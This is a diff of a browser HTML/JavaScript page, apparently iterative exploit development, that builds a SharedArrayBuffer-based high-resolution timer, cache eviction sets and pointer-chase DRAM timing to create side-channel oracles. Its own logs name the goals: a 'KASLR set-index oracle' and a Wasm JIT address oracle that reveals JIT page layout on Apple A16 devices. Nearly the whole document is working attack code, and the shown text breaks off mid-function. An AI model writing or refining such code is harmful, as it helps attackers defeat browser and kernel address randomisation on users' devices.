@@ -1,62 +1,49 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Timer + Cache Oracle v3</title></head>
+<head><meta charset="utf-8"><title>DRAM Timing + KASLR v4</title></head>
 <body>
 <pre id="log"></pre>
 <script>
-// v3 — fixes:
-// - SAB worker polluting L1 during HIT measurement: isolate probe buf far from SAB
-// - Page faults in T5/T6: touch every 64-byte cache line to fully commit
-// - Timer quantization in T5: larger BATCH per timing window
-// - T6 eviction: use minimal eviction set (9 addrs same L1 set) not 16MB sweep
+// v4 — pivot from L1 to L3/DRAM timing
 //
-// A16 L1 data cache: 128KB, 8-way set assoc, 256 sets, 64B line
-//   Set index bits = VA[13:6]  (bits 7..0 of VA>>6)
-//   To evict set N need 9 addresses where (addr>>6)&0xFF == N
-//   Stride between aliases = 16384 (0x4000)
+// Key insight from v3 results:
+//   7.93ns/count → L1(5ns)=0 counts, L2(12ns)=1 count — both unmeasurable
+//   L3 miss: ~80ns  = ~10 counts  ← first measurable level
+//   DRAM:    ~120ns = ~15 counts  ← clearly measurable
 //
-// Strategy: allocate probe array at known alignment, compute which cache sets
-// map to each element, build minimal eviction set for those sets.
+// Strategy: large random-access array (>12MB = A16 L3 size) with
+//   pointer-chase to defeat hardware prefetcher.
+//   Measure BATCH random accesses per window → accumulate ticks.
+//
+// A16 cache: L1=128KB, L2=6MB, L3/SLC≈12MB (shared)
+// Target: pointer-chase in 32MB → guaranteed DRAM misses
 
 const LOG = document.getElementById('log');
 const log = s => { LOG.textContent += s + '\n'; console.log(s); };
 
-// ── SAB counter worker ──
-// Pad SAB to 4KB so it doesn't share cache lines with our probe buffers
-const SAB_PADDING = 4096;
-const COUNTER_WORKER_SRC = `
+let counterWorker = null;
+let counterView   = null;
+let NS_PER_UNIT   = 8.0;
+
+const COUNTER_SRC = `
   self.onmessage = function(e) {
     if (e.data.cmd === 'start') {
-      const counter = new Int32Array(e.data.sab, e.data.offset, 1);
-      while (true) { Atomics.add(counter, 0, 1); }
+      const c = new Int32Array(e.data.sab, 4096, 1);
+      while (true) Atomics.add(c, 0, 1);
     }
   };
 `;
 
-let counterWorker = null;
-let counterView  = null;
-let nsPerUnit    = 4.0; // updated by T1
-
 async function startCounter() {
-  // Allocate 8KB SAB — use second 4KB page for counter to isolate from probe bufs
   const sab = new SharedArrayBuffer(8192);
-  counterView = new Int32Array(sab, 4096, 1); // counter at offset 4096
-  const blob = new Blob([COUNTER_WORKER_SRC], {type:'application/javascript'});
-  counterWorker = new Worker(URL.createObjectURL(blob));
-  counterWorker.postMessage({cmd: 'start', sab, offset: 4096});
-  await new Promise(r => setTimeout(r, 200)); // let worker ramp
+  counterView = new Int32Array(sab, 4096, 1);
+  const w = new Worker(URL.createObjectURL(new Blob([COUNTER_SRC],{type:'application/javascript'})));
+  w.postMessage({cmd:'start', sab});
+  counterWorker = w;
+  await new Promise(r=>setTimeout(r,200));
 }
 
 const rdcnt = () => Atomics.load(counterView, 0);
-
-// ─────────────────────────────────────────────────────────────
-// Fully commit a buffer: touch every 64-byte cache line
-// ─────────────────────────────────────────────────────────────
-function prefaultFull(buf) {
-  for (let i = 0; i < buf.length; i += 64) buf[i] = (i & 0xFF) || 1;
-  // second pass — TLB warm
-  for (let i = 0; i < buf.length; i += 64) buf[i] ^= 0x5A;
-}
 
 // ─────────────────────────────────────────────────────────────
 // T1: Calibrate
@@ -65,142 +52,129 @@ async function t1() {
   log('─── T1: Calibrate ───');
   const wallT0 = performance.now();
   const cntT0  = rdcnt();
-  await new Promise(r => setTimeout(r, 30));
+  await new Promise(r => setTimeout(r, 50));
   const cntT1  = rdcnt();
-  const wallT1 = performance.now();
-
-  const wallMs   = wallT1 - wallT0;
-  const cntDelta = cntT1  - cntT0;
-  nsPerUnit = (wallMs * 1e6) / cntDelta;
-
-  log(`[*] T1 rate: ${cntDelta} counts / ${wallMs.toFixed(2)}ms = ${nsPerUnit.toFixed(3)}ns/count`);
-  if (nsPerUnit < 10) log(`[!!!] T1 SUB-10ns resolution`);
-  return nsPerUnit;
+  const wallMs = performance.now() - wallT0;
+  NS_PER_UNIT  = (wallMs * 1e6) / (cntT1 - cntT0);
+  log(`[*] T1 ${(cntT1-cntT0)} counts / ${wallMs.toFixed(1)}ms = ${NS_PER_UNIT.toFixed(3)}ns/count`);
+  log(`[*] T1 measurable threshold: L3/DRAM (≥80ns = ${(80/NS_PER_UNIT).toFixed(1)} counts)`);
+  if (NS_PER_UNIT < 10) log(`[!!!] T1 SUB-10ns — targeting DRAM for measurable signal`);
 }
 
 // ─────────────────────────────────────────────────────────────
-// T2 v3: Hit/miss with isolated tiny buffer + minimal eviction set
-//
-// Probe: 32KB buf (fits in L1 — 128KB L1, our 32KB = 1/4 of L1)
-// Hot set:  lines 0–15 of buf (64B each = 1KB total)
-// Eviction set: for each of those 16 cache sets, 9 aliasing addrs
-//               from a separate 2MB eviction buf
+// Build a pointer-chase array of given size
+// Shuffled indices: next[i] = random j where j != i
+// Access: idx = arr[idx] — defeats sequential AND stride prefetcher
+// ─────────────────────────────────────────────────────────────
+function buildPointerChase(sizeBytes) {
+  const LINE    = 64;
+  const entries = Math.floor(sizeBytes / LINE); // one pointer per cache line
+  const arr     = new Int32Array(entries * (LINE/4)); // LINE-byte spacing
+
+  // Fisher-Yates shuffle of [0..entries-1]
+  const order = new Int32Array(entries);
+  for (let i = 0; i < entries; i++) order[i] = i;
+  for (let i = entries - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [order[i], order[j]] = [order[j], order[i]];
+  }
+
+  // Store pointer at arr[i * LINE/4] = order[i+1] (next in chase)
+  for (let i = 0; i < entries; i++) {
+    arr[order[i] * (LINE/4)] = order[(i + 1) % entries];
+  }
+
+  return { arr, entries, stride: LINE/4 };
+}
+
+// Run pointer chase: STEPS steps starting at idx, return final idx + count
+function chase(arr, stride, startIdx, steps) {
+  let idx = startIdx;
+  const t0 = rdcnt();
+  for (let i = 0; i < steps; i++) idx = arr[idx * stride];
+  return { cnt: rdcnt() - t0, idx };
+}
+
+// ─────────────────────────────────────────────────────────────
+// T2: DRAM miss timing via pointer chase
+// Small chase (in L1) vs large chase (in DRAM)
 // ─────────────────────────────────────────────────────────────
 async function t2() {
-  log('─── T2: Cache hit/miss (minimal eviction set) ───');
+  log('─── T2: L1 vs DRAM pointer-chase timing ───');
 
-  const LINE    = 64;
-  const WAYS    = 8;    // A16 L1 8-way
-  const SETS    = 256;  // A16 L1 256 sets
-  const STRIDE  = LINE * SETS; // 16384 — one full cache index stride
-  // STRIDE = 0x4000: two addrs with this stride map to SAME L1 set
+  const STEPS = 64; // accesses per timing window
+  const REPS  = 100;
 
-  // Probe buffer: 32KB, fully committed
-  const probeSz = 32 * 1024;
-  const probe   = new Uint8Array(probeSz);
-  prefaultFull(probe);
+  // HOT: 4KB chase — stays in L1 (~32 entries)
+  const hot = buildPointerChase(4 * 1024);
+  // COLD: 32MB chase — deep in DRAM (~524288 entries)
+  log(`[*] T2 building 32MB pointer chase...`);
+  const cold = buildPointerChase(32 * 1024 * 1024);
+  log(`[*] T2 hot entries=${hot.entries}, cold entries=${cold.entries}`);
 
-  // Eviction buffer: need WAYS+1 = 9 aliases per set.
-  // For 16 hot lines → 16 sets → 16 × 9 × STRIDE bytes needed
-  // But they can overlap: one eviction buf of 9 * STRIDE = 9 * 16384 = 147456 bytes
-  // All STRIDE-aliased addresses within it cover all 256 L1 sets
-  const evictSz = (WAYS + 1) * STRIDE; // 147456 bytes
-  const evict   = new Uint8Array(evictSz);
-  prefaultFull(evict);
+  // Pre-fault cold array (sequential touch)
+  let warmSum = 0;
+  for (let i = 0; i < cold.arr.length; i += 16) warmSum += cold.arr[i];
+  cold.arr[0] ^= warmSum & 0;
+  // Run the chase once to populate TLB
+  let tidx = 0;
+  for (let i = 0; i < cold.entries; i++) tidx = cold.arr[tidx * cold.stride];
+  cold.arr[0] ^= tidx & 0;
 
-  // Settle
-  await new Promise(r => setTimeout(r, 30));
+  await new Promise(r => setTimeout(r, 100));
 
-  const REPS        = 500;
-  const HOT_LINES   = 16;  // measure 16 hot cache lines
-  const BATCH       = 64;  // accesses per timing window → div for per-access time
+  const hotTimes  = [];
+  const coldTimes = [];
 
-  const hitCounts  = [];
-  const missCounts = [];
+  // Warm hot chase into L1
+  let hidx = 0;
+  for (let i = 0; i < hot.entries * 4; i++) hidx = hot.arr[hidx * hot.stride];
+  hot.arr[0] ^= hidx & 0;
 
   for (let rep = 0; rep < REPS; rep++) {
-    // ── Warm HOT_LINES into L1 ──
-    let warm = 0;
-    for (let b = 0; b < BATCH * 2; b++) warm += probe[(b % HOT_LINES) * LINE];
-    probe[0] ^= warm & 0;
+    // HOT chase (stays in L1)
+    const hr = chase(hot.arr, hot.stride, 0, STEPS);
+    hotTimes.push(hr.cnt / STEPS);
+    hot.arr[0] ^= hr.idx & 0;
 
-    // ── Measure HIT (lines still in L1) ──
-    {
-      const t0 = rdcnt();
-      let x = 0;
-      for (let b = 0; b < BATCH; b++) x += probe[(b % HOT_LINES) * LINE];
-      const t1 = rdcnt();
-      hitCounts.push((t1 - t0 + (x & 0)) / BATCH);
-    }
-
-    // ── Evict HOT_LINES from L1 using minimal eviction set ──
-    // Access 9 addresses aliasing each of the HOT_LINES cache sets
-    {
-      let e = 0;
-      for (let way = 0; way <= WAYS; way++) {       // 9 ways
-        for (let l = 0; l < HOT_LINES; l++) {        // 16 lines
-          e += evict[(way * STRIDE) + (l * LINE)];   // same set as probe[l*LINE]
-        }
-      }
-      evict[0] ^= e & 0;
-    }
-
-    // ── Measure MISS (lines evicted from L1, may still be in L2) ──
-    {
-      const t0 = rdcnt();
-      let x = 0;
-      for (let b = 0; b < BATCH; b++) x += probe[(b % HOT_LINES) * LINE];
-      const t1 = rdcnt();
-      missCounts.push((t1 - t0 + (x & 0)) / BATCH);
-    }
+    // COLD chase (random 32MB — DRAM misses)
+    const cr = chase(cold.arr, cold.stride, rep % cold.entries, STEPS);
+    coldTimes.push(cr.cnt / STEPS);
+    cold.arr[0] ^= cr.idx & 0;
   }
 
-  hitCounts.sort((a,b)=>a-b);
-  missCounts.sort((a,b)=>a-b);
+  hotTimes.sort((a,b)=>a-b);
+  coldTimes.sort((a,b)=>a-b);
 
-  // Percentiles
-  const pct = (arr, p) => arr[Math.floor(p/100 * arr.length)];
-  const hitP25  = pct(hitCounts, 25);
-  const hitP50  = pct(hitCounts, 50);
-  const missP25 = pct(missCounts, 25);
-  const missP50 = pct(missCounts, 50);
+  const pct = (arr,p) => arr[Math.floor(p/100*arr.length)] * NS_PER_UNIT;
+  const ps = [0,10,25,50,75,90,99];
 
-  const hitNs25  = hitP25  * nsPerUnit;
-  const missNs25 = missP25 * nsPerUnit;
-  const hitNs50  = hitP50  * nsPerUnit;
-  const missNs50 = missP50 * nsPerUnit;
+  log(`[*] T2 HOT  (L1): ${ps.map(p=>pct(hotTimes,p).toFixed(1)).join(' ')} ns`);
+  log(`[*] T2 COLD (DRAM): ${ps.map(p=>pct(coldTimes,p).toFixed(1)).join(' ')} ns`);
 
-  log(`[*] T2 HIT  p25=${hitNs25.toFixed(2)}ns  p50=${hitNs50.toFixed(2)}ns`);
-  log(`[*] T2 MISS p25=${missNs25.toFixed(2)}ns  p50=${missNs50.toFixed(2)}ns`);
+  const hotP50  = pct(hotTimes, 50);
+  const coldP50 = pct(coldTimes, 50);
+  const ratio   = hotP50 > 0 ? coldP50 / hotP50 : (coldP50 > 0 ? 99 : 0);
 
-  const pcts = [0,10,25,50,75,90,99];
-  log(`[*] T2 HIT  dist (p0/10/25/50/75/90/99): ${pcts.map(p=>(pct(hitCounts,p)*nsPerUnit).toFixed(2)).join(' ')} ns`);
-  log(`[*] T2 MISS dist (p0/10/25/50/75/90/99): ${pcts.map(p=>(pct(missCounts,p)*nsPerUnit).toFixed(2)).join(' ')} ns`);
+  log(`[*] T2 DRAM/L1 ratio p50: ${ratio.toFixed(1)}x  (hot=${hotP50.toFixed(1)}ns cold=${coldP50.toFixed(1)}ns)`);
 
-  // Use p25 for ratio (more stable than median when quantized)
-  const ratio = hitNs25 > 0 ? missNs25 / hitNs25 : (missNs25 > 0 ? 99 : 0);
-  log(`[*] T2 miss/hit ratio (p25): ${ratio.toFixed(2)}x`);
-
-  const hasSignal = ratio >= 2 || (hitNs25 === 0 && missNs25 > 0);
-  if (missNs25 > hitNs25 && missNs25 > 0.5) {
-    log(`[!!!] T2 HIT/MISS distinguishable: hit=${hitNs25.toFixed(2)}ns miss=${missNs25.toFixed(2)}ns`);
+  if (coldP50 > 50 && coldP50 > hotP50 * 3) {
+    log(`[!!!] T2 DRAM TIMING SIGNAL: ${ratio.toFixed(1)}x ratio — measurable DRAM latency`);
+  } else if (coldP50 > hotP50 * 1.5) {
+    log(`[*] T2 weak signal: ${ratio.toFixed(1)}x`);
   } else {
-    log(`[*] T2 weak or no signal at p25`);
-    // Check p50
-    if (missNs50 > hitNs50 * 1.5 && missNs50 > 1) {
-      log(`[!!!] T2 signal at p50: hit=${hitNs50.toFixed(2)}ns miss=${missNs50.toFixed(2)}ns`);
-    }
+    log(`[*] T2 no signal — timer or prefetcher issue`);
   }
 
-  return { hitNs: hitNs25, missNs: missNs25, hasSignal, probe, evict };
+  return { hotP50, coldP50, hasDRAM: coldP50 > 20 };
 }
 
 // ─────────────────────────────────────────────────────────────
-// T3: Wasm JIT icache timing
+// T3: Wasm JIT cold timing (L3/DRAM level)
+// Compile N modules, evict with 32MB sweep, time first call
 // ─────────────────────────────────────────────────────────────
-async function t3(hasSignal) {
-  log('─── T3: Wasm JIT icache timing ───');
-  if (!hasSignal) { log('[*] T3 skip — no signal'); return; }
+async function t3(hasDRAM) {
+  log('─── T3: Wasm JIT DRAM timing ───');
 
   const makeWasm = (seed) => new Uint8Array([
     0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
@@ -213,269 +187,245 @@ async function t3(hasSignal) {
     0x0b,0x0b,
   ]);
 
-  const N = 24;
+  const N = 32;
   const fns = [];
   for (let i = 0; i < N; i++) {
     try {
       const inst = await WebAssembly.instantiate(makeWasm(i));
       fns.push(inst.instance.exports.call);
-    } catch(e) { log(`  compile ${i}: ${e.message}`); }
+    } catch(e) { log(`  wasm ${i} fail: ${e.message}`); }
   }
   log(`[*] T3 compiled ${fns.length} modules`);
 
-  const BATCH = 64;
-  const evict8 = new Uint8Array(8*1024*1024);
-  prefaultFull(evict8);
+  // Warmup all
+  for (const fn of fns) { let x=0; for(let i=0;i<100;i++) x+=fn(5); }
 
-  // Warmup all fns
-  for (const fn of fns) { let x=0; for(let b=0;b<BATCH;b++) x+=fn(5); }
+  // 32MB pointer chase eviction — hits DRAM, pollutes all cache levels
+  log(`[*] T3 building eviction chase...`);
+  const evict = buildPointerChase(32 * 1024 * 1024);
+  let eidx = 0;
+  for (let i = 0; i < evict.entries; i++) eidx = evict.arr[eidx * evict.stride];
+  evict.arr[0] ^= eidx & 0;
 
-  // Evict icache: run large data sweep + many JS function calls
-  let s=0; for(let i=0;i<evict8.length;i+=64) s+=evict8[i]; evict8[0]^=s&0;
-  // Call unrelated functions to pollute icache
-  for(let i=0;i<1000;i++) Math.sin(i);
+  await new Promise(r => setTimeout(r, 20));
 
-  await new Promise(r=>setTimeout(r,5));
+  const BATCH = 32;
 
-  // Cold timing (after eviction)
-  const cold = fns.map(fn => {
+  // Cold: right after eviction
+  const evictStart = rdcnt();
+  eidx = 0;
+  for (let i = 0; i < evict.entries; i++) eidx = evict.arr[eidx * evict.stride];
+  evict.arr[0] ^= eidx & 0;
+  const evictTime = (rdcnt() - evictStart) * NS_PER_UNIT;
+  log(`[*] T3 eviction pass: ${evictTime.toFixed(0)}ns (${evict.entries} DRAM accesses)`);
+
+  const coldTimes = fns.map(fn => {
     const t0 = rdcnt();
-    let x=0; for(let b=0;b<BATCH;b++) x+=fn(5);
+    let x=0; for(let i=0;i<BATCH;i++) x+=fn(5);
     return (rdcnt()-t0+(x&0)) / BATCH;
   });
 
-  // Hot timing (immediately after, same fns in icache)
-  const hot = fns.map(fn => {
+  // Hot: same fns, now warm in icache
+  const hotTimes = fns.map(fn => {
     const t0 = rdcnt();
-    let x=0; for(let b=0;b<BATCH;b++) x+=fn(5);
+    let x=0; for(let i=0;i<BATCH;i++) x+=fn(5);
     return (rdcnt()-t0+(x&0)) / BATCH;
   });
 
-  const coldNs = cold.map(t=>t*nsPerUnit);
-  const hotNs  = hot.map(t=>t*nsPerUnit);
-  const coldAvg = coldNs.reduce((a,b)=>a+b)/coldNs.length;
-  const hotAvg  = hotNs.reduce((a,b)=>a+b)/hotNs.length;
-  const ratio   = hotAvg > 0 ? coldAvg/hotAvg : 0;
+  const pct = (arr,p) => arr.slice().sort((a,b)=>a-b)[Math.floor(p/100*arr.length)] * NS_PER_UNIT;
 
-  log(`[*] T3 cold avg=${coldAvg.toFixed(1)}ns  hot avg=${hotAvg.toFixed(1)}ns  ratio=${ratio.toFixed(2)}x`);
-  if (ratio >= 1.5) {
-    log(`[!!!] T3 JIT icache timing: cold/hot=${ratio.toFixed(1)}x → JIT page location oracle`);
+  log(`[*] T3 cold per-fn (ns): ${coldTimes.map(t=>(t*NS_PER_UNIT).toFixed(0)).join(' ')}`);
+  log(`[*] T3 hot  per-fn (ns): ${hotTimes.map(t=>(t*NS_PER_UNIT).toFixed(0)).join(' ')}`);
+
+  const coldMed = pct(coldTimes, 50);
+  const hotMed  = pct(hotTimes, 50);
+  const ratio   = hotMed > 0 ? coldMed / hotMed : 0;
+
+  log(`[*] T3 cold p50=${coldMed.toFixed(0)}ns  hot p50=${hotMed.toFixed(0)}ns  ratio=${ratio.toFixed(2)}x`);
+
+  if (coldMed > hotMed * 2 && coldMed > 20) {
+    log(`[!!!] T3 JIT icache cold/hot: ${ratio.toFixed(1)}x — JIT page location detectable via DRAM timing`);
   }
+
+  return { coldMed, hotMed };
 }
 
 // ─────────────────────────────────────────────────────────────
-// T4: Cross-core SAB write visibility latency
+// T4: Address-dependent DRAM latency
+// Probe whether different 32MB regions have different access times
+// (NUMA, page-coloring, TLB hierarchy effects)
 // ─────────────────────────────────────────────────────────────
 async function t4() {
-  log('─── T4: Cross-core SAB coherence ───');
+  log('─── T4: Address-dependent memory latency ───');
 
-  const TRIALS = 20;
-  const sab4 = new SharedArrayBuffer(128);
-  const v4 = new Int32Array(sab4);
+  // Allocate multiple separate 4MB arrays and compare their DRAM timing
+  const CHUNKS   = 8;
+  const CHUNK_SZ = 4 * 1024 * 1024; // 4MB each — > L2, < L3
+  const STEPS    = 32;
+  const REPS     = 20;
 
-  const W_SRC = `
-    self.onmessage = function(e) {
-      const v = new Int32Array(e.data.sab);
-      for (let t = 0; t < e.data.trials; t++) {
-        // Wait for trigger (main sets v[0] = t+1)
-        let spin = 0;
-        while (Atomics.load(v, 0) !== t+1 && spin < 50000000) spin++;
-        // Immediately write response
-        Atomics.store(v, 1, t+1);
-      }
-    };
-  `;
-  const wBlob = new Blob([W_SRC], {type:'application/javascript'});
-  const w4 = new Worker(URL.createObjectURL(wBlob));
-  w4.postMessage({sab: sab4, trials: TRIALS});
-  await new Promise(r=>setTimeout(r,100));
-
-  const latencies = [];
-  for (let t = 0; t < TRIALS; t++) {
-    const c0 = rdcnt();
-    Atomics.store(v4, 0, t+1);
-    // Spin-wait for worker response
-    let spins = 0;
-    while (Atomics.load(v4, 1) !== t+1 && spins < 50000000) spins++;
-    const c1 = rdcnt();
-    if (spins < 50000000) latencies.push((c1-c0)*nsPerUnit);
-    await new Promise(r=>setTimeout(r,1)); // yield between trials
+  const chunks = [];
+  for (let c = 0; c < CHUNKS; c++) {
+    const ch = buildPointerChase(CHUNK_SZ);
+    // Pre-fault
+    let s=0; for(let i=0;i<ch.arr.length;i+=16) s+=ch.arr[i]; ch.arr[0]^=s&0;
+    // TLB warm
+    let idx=0; for(let i=0;i<ch.entries;i++) idx=ch.arr[idx*ch.stride]; ch.arr[0]^=idx&0;
+    chunks.push(ch);
   }
 
-  w4.terminate();
+  await new Promise(r => setTimeout(r, 50));
 
-  if (latencies.length === 0) { log('[*] T4 worker timed out'); return; }
-  latencies.sort((a,b)=>a-b);
-  const med = latencies[Math.floor(latencies.length/2)];
-  const min = latencies[0];
-  log(`[*] T4 cross-core round-trip: min=${min.toFixed(0)}ns  median=${med.toFixed(0)}ns  (${latencies.length} trials)`);
-  if (min < 2000) log(`[!!!] T4 sub-2µs cross-core coherence — tight SAB timing oracle`);
-}
+  // 32MB eviction
+  const evict = buildPointerChase(32 * 1024 * 1024);
+  let eidx=0;
+  for(let i=0;i<evict.entries;i++) eidx=evict.arr[eidx*evict.stride];
+  evict.arr[0]^=eidx&0;
 
-// ─────────────────────────────────────────────────────────────
-// T5 v3: Per-line timing within single 4KB page
-// Ensures all lines are L1-hot, times individual line re-reads
-// with BATCH to accumulate counter ticks
-// ─────────────────────────────────────────────────────────────
-async function t5() {
-  log('─── T5: Per-line timing within 4KB page ───');
+  await new Promise(r=>setTimeout(r,10));
 
-  const PAGE = 4096;
-  const LINE = 64;
-  const LINES_PER_PAGE = PAGE / LINE; // 64 lines per page
-  const buf5 = new Uint8Array(PAGE * 4); // 16KB — 4 pages
-  prefaultFull(buf5);
-
-  await new Promise(r=>setTimeout(r,20));
-
-  const REPS  = 100;
-  const BATCH = 128; // reps within each line timing
-
-  // We want to measure: how long does one cache line re-read take?
-  // Warm page 0 fully into L1, then time individual lines.
-  // Use minimal eviction set to evict specific lines.
-
-  // Time each line in page 0 while everything is hot
-  const hotLineNs = [];
-  // First warm everything
-  for (let l = 0; l < LINES_PER_PAGE; l++) {
-    let w=0; for(let b=0;b<BATCH;b++) w+=buf5[l*LINE]; buf5[l*LINE]^=w&0;
-  }
-
-  for (let l = 0; l < LINES_PER_PAGE; l++) {
-    const t0 = rdcnt();
-    let x = 0;
-    for (let b = 0; b < BATCH; b++) x += buf5[l * LINE];
-    const dt = (rdcnt() - t0 + (x & 0));
-    hotLineNs.push(dt / BATCH * nsPerUnit);
-  }
-
-  log(`[*] T5 hot line timings (ns/access), 64 lines:`);
-  // Print in groups of 8
-  for (let i = 0; i < LINES_PER_PAGE; i += 8) {
-    log(`[*] T5   L${i.toString().padStart(2,'0')}-${(i+7).toString().padStart(2,'0')}: ${hotLineNs.slice(i,i+8).map(n=>n.toFixed(2)).join(' ')}`);
-  }
-
-  const nonZero = hotLineNs.filter(n=>n>0);
-  log(`[*] T5 nonZero timings: ${nonZero.length}/${LINES_PER_PAGE}`);
-  if (nonZero.length > 0) {
-    const minNs  = Math.min(...nonZero);
-    const maxNs  = Math.max(...hotLineNs);
-    log(`[*] T5 range: ${minNs.toFixed(2)}ns – ${maxNs.toFixed(2)}ns`);
-    if (maxNs > minNs * 3 && maxNs > 2) {
-      log(`[!!!] T5 variance in hot-line timing: ${(maxNs/minNs).toFixed(1)}x spread — cache non-uniformity detectable`);
-    }
-  } else {
-    log(`[*] T5 all timings zero — need bigger BATCH`);
-  }
-}
-
-// ─────────────────────────────────────────────────────────────
-// T6 v3: L1 cache set aliasing — fixed
-// Use SMALL probe array (4KB) fully committed
-// Build proper eviction set: 9 addresses × 16KB stride
-// This guarantees targeting specific L1 sets without page faults
-// ─────────────────────────────────────────────────────────────
-async function t6() {
-  log('─── T6: L1 set aliasing probe (fixed) ───');
-
-  const LINE  = 64;
-  const SETS  = 256;      // A16 L1
-  const WAYS  = 8;        // A16 L1 8-way
-  const S     = LINE * SETS; // 0x4000 = 16384 — L1 set stride
-
-  // Probe: just 2 cache lines at known offsets
-  // Line A at offset 0, Line B at varying offsets
-  // Use a 512KB buffer so B can be far from A without page boundary issues
-  const SZ = (WAYS + 2) * S; // 10 * 16384 = 163840 bytes
-  const buf = new Uint8Array(SZ);
-  prefaultFull(buf);
-  await new Promise(r=>setTimeout(r,20));
-
-  const BATCH = 256; // large batch for stable timing
-  const REPS  = 30;
-
-  // We'll probe: does accessing buf[X] evict buf[0]?
-  // If buf[X] is in same L1 set as buf[0], then after WAYS+1 accesses
-  // to X-aliasing addresses, buf[0] should be cold.
-
-  // Build eviction addresses for buf[0]'s set:
-  // buf[0] maps to set (buf_base >> 6) & 0xFF — we don't know base, but
-  // addresses at multiples of S from buf[0] will alias the SAME set.
-  // So: buf[0], buf[S], buf[2S], ... buf[8S] all alias set 0 relative to base.
-
-  // Test: load buf[0], then access {buf[S], buf[2S], ..., buf[8S]} (= 8 more aliases),
-  // then re-time buf[0]. If evicted by the 8 aliases → buf[0] is now cold.
-
-  const evictAddrs = Array.from({length: WAYS}, (_, i) => (i + 1) * S);
-
-  const timings = {hot: [], evicted: []};
+  const chunkTimings = chunks.map(() => []);
 
   for (let rep = 0; rep < REPS; rep++) {
-    // Warm buf[0] into L1
-    let w = 0;
-    for (let b = 0; b < BATCH; b++) w += buf[0];
-    buf[0] ^= w & 0;
+    // Evict caches between reps
+    let eidx2=0;
+    for(let i=0;i<evict.entries;i++) eidx2=evict.arr[eidx2*evict.stride];
+    evict.arr[0]^=eidx2&0;
 
-    // Measure HOT
-    {
+    for (let c = 0; c < CHUNKS; c++) {
+      const ch = chunks[c];
       const t0 = rdcnt();
-      let x = 0; for (let b = 0; b < BATCH; b++) x += buf[0];
-      timings.hot.push((rdcnt() - t0 + (x & 0)) / BATCH);
-    }
-
-    // Evict buf[0] by accessing 8 same-set aliases
-    {
-      let e = 0;
-      for (const addr of evictAddrs) {
-        for (let b = 0; b < WAYS + 1; b++) e += buf[addr];
-      }
-      buf[0] ^= e & 0;
-    }
-
-    // Measure COLD (buf[0] evicted from L1, may be in L2)
-    {
-      const t0 = rdcnt();
-      let x = 0; for (let b = 0; b < BATCH; b++) x += buf[0];
-      timings.evicted.push((rdcnt() - t0 + (x & 0)) / BATCH);
+      let idx = rep % ch.entries;
+      for (let s = 0; s < STEPS; s++) idx = ch.arr[idx * ch.stride];
+      const dt = (rdcnt() - t0 + (idx & 0)) / STEPS;
+      chunkTimings[c].push(dt);
     }
   }
 
-  timings.hot.sort((a,b)=>a-b);
-  timings.evicted.sort((a,b)=>a-b);
+  log(`[*] T4 per-chunk median latency (32 steps/window, 20 reps):`);
+  const medians = chunkTimings.map((ts, c) => {
+    ts.sort((a,b)=>a-b);
+    const med = ts[Math.floor(ts.length/2)] * NS_PER_UNIT;
+    log(`[*] T4   chunk ${c}: median=${med.toFixed(1)}ns  p90=${(ts[Math.floor(ts.length*0.9)]*NS_PER_UNIT).toFixed(1)}ns`);
+    return med;
+  });
 
-  const pct = (arr, p) => arr[Math.floor(p/100*arr.length)] * nsPerUnit;
-  const hotP25     = pct(timings.hot, 25);
-  const hotP50     = pct(timings.hot, 50);
-  const evictP25   = pct(timings.evicted, 25);
-  const evictP50   = pct(timings.evicted, 50);
+  const minMed = Math.min(...medians);
+  const maxMed = Math.max(...medians);
+  const spread = maxMed / Math.max(minMed, 0.1);
 
-  log(`[*] T6 HOT   p25=${hotP25.toFixed(2)}ns  p50=${hotP50.toFixed(2)}ns`);
-  log(`[*] T6 EVICT p25=${evictP25.toFixed(2)}ns  p50=${evictP50.toFixed(2)}ns`);
+  log(`[*] T4 min=${minMed.toFixed(1)}ns max=${maxMed.toFixed(1)}ns spread=${spread.toFixed(2)}x`);
 
-  const ps = [0,10,25,50,75,90,99];
-  log(`[*] T6 HOT   dist: ${ps.map(p=>pct(timings.hot,p).toFixed(2)).join(' ')} ns`);
-  log(`[*] T6 EVICT dist: ${ps.map(p=>pct(timings.evicted,p).toFixed(2)).join(' ')} ns`);
-
-  const ratio = hotP25 > 0 ? evictP25/hotP25 : (evictP25 > 0 ? 99 : 0);
-  log(`[*] T6 evict/hot ratio (p25): ${ratio.toFixed(2)}x`);
-
-  if (evictP25 > hotP25 * 2 && evictP25 > 1) {
-    log(`[!!!] T6 L1 EVICTION CONFIRMED: hot=${hotP25.toFixed(2)}ns evicted=${evictP25.toFixed(2)}ns ratio=${ratio.toFixed(1)}x`);
-    log(`[!!!] T6 Same-set aliasing at stride=0x${S.toString(16)} confirmed → KASLR set-index oracle ready`);
-  } else if (evictP50 > hotP50 * 1.5) {
-    log(`[*] T6 weak signal at p50: hot=${hotP50.toFixed(2)}ns evicted=${evictP50.toFixed(2)}ns`);
-  } else {
-    log(`[*] T6 no eviction signal — either eviction set wrong or L1 set index stride differs`);
-    log(`[*] T6 check: expected A16 L1 stride=16384 (0x4000). May vary.`);
+  if (spread >= 2 && minMed > 5) {
+    log(`[!!!] T4 ADDRESS-DEPENDENT LATENCY: ${spread.toFixed(1)}x spread across chunks`);
+    log(`[!!!] T4 → allocation address affects access time → detectable via timing`);
   }
+}
+
+// ─────────────────────────────────────────────────────────────
+// T5: Wasm JIT address oracle — timing variance across modules
+// After full cache eviction, do multiple cold/hot rounds.
+// Modules with JIT code at DRAM-resident addresses show cold > hot.
+// Variance in cold timing across modules reveals JIT page layout.
+// ─────────────────────────────────────────────────────────────
+async function t5() {
+  log('─── T5: Wasm JIT address oracle ───');
+
+  const makeWasm = (a, b) => new Uint8Array([
+    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
+    0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
+    0x03,0x02,0x01,0x00,
+    0x07,0x08,0x01,0x04,0x63,0x61,0x6c,0x6c,0x00,0x00,
+    0x0a,0x11,0x01,0x0f,0x00,
+    // body: return arg + const_a + const_b (makes function bigger/unique)
+    0x20,0x00, 0x41,a&0xff, 0x6a, 0x41,b&0xff, 0x6a,
+    0x0b,
+  ]);
+
+  // Compile 16 modules and do many cold/hot timing rounds
+  const N = 16;
+  const fns = [];
+  for (let i = 0; i < N; i++) {
+    try {
